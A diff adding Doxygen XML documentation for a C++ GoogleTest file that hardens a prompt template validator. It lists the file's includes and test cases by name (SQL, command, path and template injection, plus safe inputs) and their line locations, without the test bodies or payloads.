@@ -1,0 +1,1129 @@
+<?xml version='1.0' encoding='UTF-8' standalone='no'?>
+<doxygen xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="compound.xsd" version="1.17.0" xml:lang="en-US">
+  <compounddef id="test__prompt__engineering__validation__hardening_8cpp" kind="file" language="C++">
+    <compoundname>test_prompt_engineering_validation_hardening.cpp</compoundname>
+    <includes local="no">gtest/gtest.h</includes>
+    <includes refid="prompt__template__validator_8h" local="yes">prompt_engineering/prompt_template_validator.h</includes>
+    <includes local="no">nlohmann/json.hpp</includes>
+    <incdepgraph>
+      <node id="3">
+        <label>prompt_engineering/prompt_template_validator.h</label>
+        <link refid="prompt__template__validator_8h"/>
+        <childnode refid="4" relation="include">
+        </childnode>
+        <childnode refid="5" relation="include">
+        </childnode>
+        <childnode refid="6" relation="include">
+        </childnode>
+      </node>
+      <node id="1">
+        <label>tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp</label>
+        <link refid="test__prompt__engineering__validation__hardening_8cpp"/>
+        <childnode refid="2" relation="include">
+        </childnode>
+        <childnode refid="3" relation="include">
+        </childnode>
+        <childnode refid="6" relation="include">
+        </childnode>
+      </node>
+      <node id="2">
+        <label>gtest/gtest.h</label>
+      </node>
+      <node id="6">
+        <label>nlohmann/json.hpp</label>
+      </node>
+      <node id="4">
+        <label>string</label>
+      </node>
+      <node id="5">
+        <label>vector</label>
+      </node>
+    </incdepgraph>
+    <innerclass refid="class_prompt_template_validator_hardening_test" prot="public">PromptTemplateValidatorHardeningTest</innerclass>
+    <sectiondef kind="func">
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SQL_BasicUnionInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SQL_BasicUnionInjection</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="42" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="42" bodyend="48"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a9b9dc9ab82ad89a0f02985d985fe78dd" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SQL_DropTableInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SQL_DropTableInjection</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="50" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="50" bodyend="55"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1adfc9eabdcf761c7effb7318e79a6c639" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SQL_QuotedInjectionAttempt)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SQL_QuotedInjectionAttempt</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="57" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="57" bodyend="62"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1af91754139ce484f7a050d0120d20260c" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SQL_MultipleInjectionVectors)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SQL_MultipleInjectionVectors</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="64" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="64" bodyend="69"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1adfbcdb3534838c508bf83b07c020d14e" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SQL_CaseInsensitivity)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SQL_CaseInsensitivity</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="71" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="71" bodyend="76"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1aeb6ff064aa78cff9b75076ae25ad3733" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_PipeInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_PipeInjection</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="82" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="82" bodyend="87"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a3e49f7bc1828c1cf95b2fc4eb506e465" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_SemicolonInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_SemicolonInjection</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="89" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="89" bodyend="94"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a0e47a954f6492b2569df8f6d72ba0277" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_BacktickExecution)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_BacktickExecution</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="96" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="96" bodyend="101"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1ac83cae1b432177b3d1d0620c6e9286fa" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_DollarParenSubstitution)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_DollarParenSubstitution</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="103" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="103" bodyend="108"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1ac45be30bffcf17b73c938dec6a5c5697" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_LogicalAndOr)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_LogicalAndOr</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="110" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="110" bodyend="115"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a55855d313c33743931a78caf27c67a05" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, CMD_AmpersandBgExecution)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>CMD_AmpersandBgExecution</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="117" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="117" bodyend="122"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a4a7ae0d334156727fd46c51a9e7d6877" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, PATH_DotDotSlashTraversal)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>PATH_DotDotSlashTraversal</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="128" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="128" bodyend="133"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1abcfa3528778cab9b34f317f2695ad184" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, PATH_WindowsBackslashTraversal)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>PATH_WindowsBackslashTraversal</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="135" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="135" bodyend="140"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1aa13adb2fb933ba0a1ee494168edd3987" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, PATH_EtcPasswdAccess)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>PATH_EtcPasswdAccess</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="142" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="142" bodyend="147"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1ae00ccf08bdadd0525b51d85f9a6871f5" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, PATH_HomeDirectoryAccess)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>PATH_HomeDirectoryAccess</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="149" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="149" bodyend="154"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1adba332db80f57af75ad86380711b84a4" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, PATH_TildeExpansion)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>PATH_TildeExpansion</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="156" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="156" bodyend="161"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a5b6da28c731782f77331b13842457fcf" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, TEMPL_TripleBraceEscape)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>TEMPL_TripleBraceEscape</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="167" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="167" bodyend="172"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a89d3821ee46e668baa87c7af286b3476" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, TEMPL_Jinja2ForLoop)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>TEMPL_Jinja2ForLoop</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="174" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="174" bodyend="179"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a103f842c2a7ff20d72b837d2ac4a116f" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, TEMPL_Jinja2Macro)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>TEMPL_Jinja2Macro</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="181" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="181" bodyend="186"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a624bd2bbab8258f9689a0a8f34c14941" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, TEMPL_Jinja2Import)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>TEMPL_Jinja2Import</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="188" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="188" bodyend="193"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a1a43df268082c1d8d504f863d5512a7d" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EDGE_MixedInjectionVectors)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EDGE_MixedInjectionVectors</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="199" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="199" bodyend="206"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a69b997998d0a27daef6ae4602205765a" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EDGE_EncodedInjection)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EDGE_EncodedInjection</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="208" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="208" bodyend="214"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1ab1f8f29f66761c3ca95ac4512693ac95" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EDGE_EscapeSequences)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EDGE_EscapeSequences</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="216" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="216" bodyend="221"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a7ae466118145adf499452196d5b77a50" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EDGE_LongPayload)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EDGE_LongPayload</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="223" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="223" bodyend="230"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a2607d40472feb7cf3f2eb9c5c3cb9eb8" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EDGE_WhitespaceObfuscation)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EDGE_WhitespaceObfuscation</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="232" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="232" bodyend="237"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1ae529fd9765ac2bdf5c6fe6bb11e580bf" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SAFE_SimpleInterpolation)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SAFE_SimpleInterpolation</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="243" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="243" bodyend="248"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a119c3336fd6ba8999f6d509c1fbd90fb" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SAFE_NaturalLanguage)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SAFE_NaturalLanguage</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="250" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="250" bodyend="257"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a735c796f2ca89be319ecc0d409e44e53" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SAFE_StructuredData)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SAFE_StructuredData</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="259" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="259" bodyend="264"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a5e186a3967d74070af3263842f0469e7" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, SAFE_URLandEmail)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>SAFE_URLandEmail</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="266" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="266" bodyend="271"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1adf93ff094108415e66864edc93cae275" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, COVER_AllInjectionTypes)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>COVER_AllInjectionTypes</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="277" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="277" bodyend="293"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a62a10a44bd89190b4eb027325949f118" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, COVER_DirectMethodCall)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>COVER_DirectMethodCall</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="295" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="295" bodyend="302"/>
